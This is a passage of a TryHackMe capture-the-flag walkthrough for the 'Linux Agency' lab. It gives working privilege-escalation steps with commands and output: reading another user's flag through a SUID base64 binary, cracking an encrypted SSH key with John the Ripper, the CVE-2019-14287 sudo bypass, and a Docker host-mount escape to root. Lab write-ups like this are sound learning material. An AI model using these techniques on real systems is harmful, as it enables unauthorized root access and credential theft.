uid=1037(sean) gid=1037(sean) groups=1037(sean),4(adm)
sean@linuxagency:~$ 
```

This means we can read logs in `/var/log`.

```bash
sean@linuxagency:~$ cd /var/log
sean@linuxagency:/var/log$ grep -R 'sean{' * 2>/dev/null
syslog.bak:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{<REDACTED>} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
sean@linuxagency:/var/log$ echo 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d
The password of penelope is p<REDACTED>e
sean@linuxagency:/var/log$ 
```

Answer: `sean{<REDACTED>}`

#### What is penelope's flag?

Hint: Maybe you need to check the attendance register.

We switch to the `penelope` user with `su`.

```bash
sean@linuxagency:/var/log$ su penelope
Password: 
penelope@linuxagency:/var/log$ cd /home/penelope/
penelope@linuxagency:~$ ls -la
total 80
drwxr-x---  3 penelope penelope  4096 Jan 12  2021 .
drwxr-xr-x 45 root     root      4096 Jan 12  2021 ..
-rwsr-sr-x  1 maya     maya     39096 Jan 12  2021 base64
lrwxrwxrwx  1 penelope penelope     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 penelope penelope   220 Jan 12  2021 .bash_logout
-rw-r--r--  1 penelope penelope  3771 Jan 12  2021 .bashrc
-rw-r--r--  1 penelope penelope  8980 Jan 12  2021 examples.desktop
-r--------  1 penelope penelope    43 Jan 12  2021 flag.txt
drwx------  3 penelope penelope  4096 Jan 12  2021 .gnupg
-rw-r--r--  1 penelope penelope   807 Jan 12  2021 .profile
penelope@linuxagency:~$ cat flag.txt
penelope{<REDACTED>}
penelope@linuxagency:~$ 
```

Answer: `penelope{<REDACTED>}`

#### What is maya's flag?

Hint: 8m x 8m pillars are always strong for building a good base of a building. But, This time we will use iron rods in concrete to make it even better. `flag==password`

There is a SUID `base64` program in our home directory.

We can use it to get the flag.

```bash
penelope@linuxagency:~$ ./base64 /home/maya/flag.txt | base64 -d
maya{<REDACTED>}
penelope@linuxagency:~$ 
```

Answer: `maya{<REDACTED>}`

#### What is robert's Passphrase?

```bash
penelope@linuxagency:~$ su maya
Password: 
maya@linuxagency:/home/penelope$ cd ../maya
maya@linuxagency:~$ ls -la
total 52
drwxr-x---  5 maya maya 4096 Jan 15  2021 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 maya maya    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 maya maya 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
-rw-r--r--  1 maya maya 8980 Jan 12  2021 examples.desktop
-r--------  1 maya maya   39 Jan 12  2021 flag.txt
drwxr-xr-x  3 maya maya 4096 Jan 12  2021 .local
drwxr-xr-x  2 maya maya 4096 Jan 15  2021 old_robert_ssh
-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
drwx------  2 maya maya 4096 Jan 12  2021 .ssh
maya@linuxagency:~$ cd old_robert_ssh/
maya@linuxagency:~/old_robert_ssh$ ls -la
total 16
drwxr-xr-x 2 maya maya 4096 Jan 15  2021 .
drwxr-x--- 5 maya maya 4096 Jan 15  2021 ..
-rw------- 1 maya maya 1766 Jan 12  2021 id_rsa
-rw-r--r-- 1 maya maya  401 Jan 15  2021 id_rsa.pub
maya@linuxagency:~/old_robert_ssh$ 
```

Ah, we have robert's SSH key pair.

Let's view, copy and save the private key on our Kali machine for cracking.

```bash
maya@linuxagency:~/old_robert_ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B

iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6
i07H7ZSczz4nuenYJGIE7ZfDYtVVA9R6IdcIZecYF2L3OfHoR/ghGOlbLC+Hyvky
RMcrEgajpdV7zCPRHckiBioxzx1K7kfkinyiSBoV9pz9PuAKo47OHtKDdtjWFV+A
PkiWa8aCmAGShC9RZkZLMRhVkR0TZGOgJGTs/MncopyJJ6TgJ9AzHcQo3vcf5A3k
7f3+9Niw7mMFmWrU35WOBpAynGkK9eDTvt/DoIMJcT9KL1BBaEzReO8mETNqfT5G
QncO/4tBSG7QaU6pQkd+UiZCtltp47Tu9hwSEsxDIleespuBn9mDHrYtBDC8jEBq
nqm0sDdYOPzjUTMDSJgqmLZ0lzagTa1OMNUlvRAz5Sde4bKAoYRgVvBWJ4whn4H+
OIHhFQ6tbCVr/0tosYrc9ehM4N4TiJ0SyfrP1XmDo8bud+UtNf2Tf/vKjYT9FP+/
+HqrIn1ou4Cvvu/jPbwVU8Ejh4CX/TJhDK6JqLzsqOp0M8jBccCR+zrRXcZsKLnG
JUTqxKwML7FhRiAgeTmOUx43XVOvzrNOmZ+8EmbmE4fW5x9UKR2nzKgILwHApayK
dmKbym96uSoQOm4KycXjoDVw9nAgRQQVQ+3Ndy0JwuyXN7keNcesEN5hb5VNN9VP
jp+mS+c/CctyLSgZkGJif2r2N+3x2AZFkDs059sPQB8UGvI4w41qGBubfsHAvVPW
KH+HAgj1i1RM0/XZ5XKIl0K4iO/eQ5xTAPah51f6LCYnZo/G6fM7IT72k0Z0KMZ8
EiySGtRCcv7vrkVRjkgmw4lAeGLJ9FBOw8IdKa9ftYJauKY/E0Gs1Qhefl+3K2BB
4PJ+Pr/doZ3Dkq4Q/YPrKnbKEbs/3Zvbu/XT5y+joS6tzF3Raz6xW0kg3NyaA1B5
V5zoj0/tnBb9Lc0YH7s2QT+9drFH4w8tb5kjyd1jlER3Hs4m31cniCsxDlKoTwk/
uAGurW23NZ4QF+3/PgjZRhudpNjcOP69Ys2XGAecxO9uBx9JjPR/cn9c54v4s/kH
n6v24eXF2uGGlEsvEpzIpk6UDap7YoxnRKIPo0mZ5G7/MS9+RL6dv9rmJ6IQd7Cr
fPjhz8snqfuGCAVveKWIOPnlfYiYJ2nQ6yA1Soyt9outfLbwIzDh7e+eqaOP2amh
rGCqwxrj9cj4sH/MzvKZVARzH3hs39wRmoEtx9ML/uXsp22DqUODOxc7cdUlRs99
zTj8CHFpM6X+ihSF33Eg0qBJwkyWzdKQiFKNTm8ld4wzov1tdKeRC7nlUh5F4lkf
yExiUTllJq8pJ3JAC/LEvQXF041fcmQ0RvoL1n3nyqIvvOjuY7UDZrcmuWQ+epdE
APKzOgkxhEqsozt8kj810m3bjIWngenwRcGL6M1ZsvwT1YwGUKG47wX2Ze3tp3ge
K4NUD9GdZJIiu8qdpyMIFKR9MfM3Pur5JRUK0IjCD43xk9p6LZYK00C3N2F4exwM
Ye5kHYeqZLpl4ljZSBoNtEK1BbYSffBt2XdoQsAvft1iwjdtZ9E644oTp9QYjloE
-----END RSA PRIVATE KEY-----
maya@linuxagency:~/old_robert_ssh$ 
```

At our Kali machine we extract the hash and crack it with JtR.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ vi robert_id_rsa    

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ ssh2john robert_id_rsa > robert_hash.txt              

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt robert_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
i<REDACTED>n   (robert_id_rsa)     
1g 0:00:00:03 DONE (2026-08-25 18:39) 0.2873g/s 2107Kp/s 2107Kc/s 2107KC/s indux.0210..indus01
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Answer: `i<REDACTED>n`

#### What is user.txt?

Hint: EVC[::-1]

We can use the private SSH key to login as `robert`.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ chmod 600 robert_id_rsa 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ ssh -i robert_id_rsa robert@$TARGET_IP
Enter passphrase for key 'robert_id_rsa': 
Connection closed by 10.113.141.190 port 22
```

No, we are not accepted. Let's double check if SSH could be running on multiple ports.

```bash
maya@linuxagency:~/old_robert_ssh$ ss -tnlp
State                     Recv-Q                     Send-Q                                          Local Address:Port                                           Peer Address:Port                     
LISTEN                    0                          128                                                 127.0.0.1:2222                                                0.0.0.0:*                        
LISTEN                    0                          128                                                 127.0.0.1:33455                                               0.0.0.0:*                        
LISTEN                    0                          128                                                 127.0.0.1:80                                                  0.0.0.0:*                        
LISTEN                    0                          128                                             127.0.0.53%lo:53                                                  0.0.0.0:*                        
LISTEN                    0                          128                                                   0.0.0.0:22                                                  0.0.0.0:*                        
LISTEN                    0                          5                                                   127.0.0.1:631                                                 0.0.0.0:*                        
LISTEN                    0                          128                                                      [::]:22                                                     [::]:*                        
LISTEN                    0                          5                                                       [::1]:631                                                    [::]:*                        
maya@linuxagency:~/old_robert_ssh$ 
```

Yes, there in also something listening on port 2222 but on `127.0.0.1` only.

Let's try that.

```bash
maya@linuxagency:~/old_robert_ssh$ ssh -i id_rsa -p 2222 robert@localhost
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:tHRuLtVLrzk2hp6qNgrziq6NZKkEQY+rN1E1J7K7lIE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.
robert@localhost's password: 
Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
robert@ec96850005d6:~$ 
```

Success!

We start by checking for standard files.

```bash
robert@ec96850005d6:~$ ls -la
total 24
drwxr-xr-x 2 robert robert 4096 Jan 12  2021 .
drwxr-xr-x 1 root   root   4096 Jan 12  2021 ..
lrwxrwxrwx 1 robert robert    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rw-r--r-- 1 robert robert   78 Jan 12  2021 robert.txt
robert@ec96850005d6:~$ cat robert.txt
You shall not pass from here!!!

I will not allow ICA to take over my world.

robert@ec96850005d6:~$ 
```

Next, we also check `sudo -l`.

```bash
robert@ec96850005d6:~$ sudo -l
Matching Defaults entries for robert on ec96850005d6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on ec96850005d6:
    (ALL, !root) NOPASSWD: /bin/bash
robert@ec96850005d6:~$ 
```

We can run `bash` but not as root. Let's investigate `sudo` further.

```bash
robert@ec96850005d6:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
robert@ec96850005d6:~$ 
```

Versions earlier than `1.8.28` are vulnerable to [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287).

```bash
robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
root@ec96850005d6:~# id
uid=0(root) gid=1000(robert) groups=1000(robert)
root@ec96850005d6:~# cd /root
root@ec96850005d6:/root# ls -la
total 40
drwx------ 1 root root 4096 Jan 12  2021 .
drwxr-xr-x 1 root root 4096 Jan 12  2021 ..
-rw------- 1 root root  852 Jan 12  2021 .bash_history
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x 3 root root 4096 Jan 12  2021 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxr-xr-x 2 root root 4096 Jan 12  2021 .ssh
-rw------- 1 root root 3148 Jan 12  2021 .viminfo
-rw-r--r-- 1 root root  204 Jan 12  2021 success.txt
-r-------- 1 root root   39 Jan 12  2021 user.txt
root@ec96850005d6:/root# cat success.txt 
47 you made it!!!

You have made it, Robert has been taught a lesson not to mess with ICA.
Now, Return to our Agency back with some safe route.
All the previous door's have been closed.

Good Luck Amigo!
root@ec96850005d6:/root# cat user.txt 
user{<REDACTED>}
root@ec96850005d6:/root# 
```

Answer: `user{<REDACTED>}`

#### What is root.txt?

Hint: Blue whale was a bad game. Wasn't it ???

The `Blue whale` should be Docker.

```bash
root@ec96850005d6:/root# find / -name docker*
/run/docker.pid
/run/docker
/run/docker.sock
/tmp/docker
/usr/share/vim/vim80/ftplugin/dockerfile.vim
/usr/share/vim/vim80/syntax/dockerfile.vim
find: ‘/proc/1/map_files’: Permission denied
find: ‘/proc/6/map_files’: Permission denied
find: ‘/proc/8/map_files’: Permission denied
find: ‘/proc/9/map_files’: Permission denied
find: ‘/proc/23/map_files’: Permission denied
/etc/apt/apt.conf.d/docker-clean
/etc/apt/apt.conf.d/docker-autoremove-suggests
/etc/apt/apt.conf.d/docker-no-languages
/etc/apt/apt.conf.d/docker-gzip-indexes
/etc/dpkg/dpkg.cfg.d/docker-apt-speedup
root@ec96850005d6:/root# /run/docker ps
bash: /run/docker: Is a directory
root@ec96850005d6:/root# /tmp/docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
ec96850005d6        mangoman            "/usr/sbin/sshd -D"   5 years ago         Up 2 hours          127.0.0.1:2222->22/tcp   kronstadt_industries
root@ec96850005d6:/root# 
```

Confirmed! Docker is running. Let's use [GFFOBins](https://gtfobins.org/gtfobins/docker/) a final time.

```bash
root@ec96850005d6:/root# /tmp/docker run -v /:/mnt --rm -it mangoman chroot /mnt /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/
# cd /root
# ls -l
total 8
-r-------- 1 root root 271 Jan 12  2021 message.txt
-r-------- 1 root root  39 Jan 12  2021 root.txt
# cat message.txt
Nice Job 47
We are really impressed with your skills

Hope you enjoyed your journey!!

Your director's of ICA 
   0z09e & Xyan1d3


========>0z09e
https://github.com/0z09e
https://twitter.com/0z09e

========>Xyan1d3
https://twitter.com/xyan1d3
https://github.com/xyan1d3
# cat root.txt
root{<REDACTED>}
# 
```

Answer: `root{<REDACTED>}`

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [Binary number - Wikipedia](https://en.wikipedia.org/wiki/Binary_number)
- [C (programming language) - Wikipedia](https://en.wikipedia.org/wiki/C_(programming_language))
- [cat - Linux manual page](https://man7.org/linux/man-pages/man1/cat.1.html)
- [cd - Linux manual page](https://man7.org/linux/man-pages/man1/cd.1p.html)
- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [cron - Wikipedia](https://en.wikipedia.org/wiki/Cron)
- [crontab(5) - Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [CVE-2019-14287 - NIST](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
- [date - Linux manual page](https://man7.org/linux/man-pages/man1/date.1.html)
- [docker - Manual page](https://manpages.org/docker)
- [docker-run - Manual page](https://manpages.org/docker-run)
- [docker - GTFOBins](https://gtfobins.org/gtfobins/docker/)
- [Docker (software) - Wikipedia](https://en.wikipedia.org/wiki/Docker_(software))
- [echo - Linux manual page](https://man7.org/linux/man-pages/man1/echo.1.html)
- [env - Linux manual page](https://man7.org/linux/man-pages/man1/env.1.html)
- [Environment variable - Wikipedia](https://en.wikipedia.org/wiki/Environment_variable)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [fold - Linux manual page](https://man7.org/linux/man-pages/man1/fold.1.html)
- [gcc - Linux manual page](https://man7.org/linux/man-pages/man1/gcc.1.html)
- [git - GTFOBins](https://gtfobins.org/gtfobins/git/)
- [git - Linux manual page](https://man7.org/linux/man-pages/man1/git.1.html)
- [Git - Wikipedia](https://en.wikipedia.org/wiki/Git)
- [git-log - Linux manual page](https://man7.org/linux/man-pages/man1/git-log.1.html)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [GTFOBins - Homepage](https://gtfobins.github.io/)
- [gunzip - Linux manual page](https://linux.die.net/man/1/gunzip)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [Hexadecimal - Wikipedia](https://en.wikipedia.org/wiki/Hexadecimal)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [Java (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Java_(programming_language))
- [javac - Linux manual page](https://linuxcommandlibrary.com/man/javac)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [Looping Constructs - Bash Reference Manual](https://www.gnu.org/software/bash/manual/bash.html#Looping-Constructs)
- [less - Linux manual page](https://man7.org/linux/man-pages/man1/less.1.html)
- [less - GTFOBins](https://gtfobins.org/gtfobins/less/)
- [ls - Linux manual page](https://man7.org/linux/man-pages/man1/ls.1.html)
- [ltrace - Linux manual page](https://man7.org/linux/man-pages/man1/ltrace.1.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [PATH (variable) - Wikipedia](https://en.wikipedia.org/wiki/PATH_(variable))
- [printf(1) - Linux manual page](https://man7.org/linux/man-pages/man1/printf.1.html)
- [python - Linux manual page](https://linux.die.net/man/1/python)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [read(1) - Linux manual page](https://www.man7.org/linux/man-pages/man1/read.1p.html)
- [rev - Linux manual page](https://man7.org/linux/man-pages/man1/rev.1.html)
- [Reverse Shell Generator - Homepage](https://www.revshells.com/)
- [ruby - Linux manual page](https://linux.die.net/man/1/ruby)
- [Ruby (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Ruby_(programming_language))
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [ss - Linux manual page](https://man7.org/linux/man-pages/man8/ss.8.html)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [strings - Linux manual page](https://man7.org/linux/man-pages/man1/strings.1.html)
- [stty - Linux manual page](https://man7.org/linux/man-pages/man1/stty.1.html)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [vim - Linux manual page](https://linux.die.net/man/1/vim)
- [vim - GTFOBins](https://gtfobins.org/gtfobins/vim/)
- [which - Linux manual page](https://linux.die.net/man/1/which)
- [xxd - Linux manual page](https://linux.die.net/man/1/xxd)
- [zip - GTFOBins](https://gtfobins.org/gtfobins/zip/)
- [zip - Linux manual page](https://linux.die.net/man/1/zip)
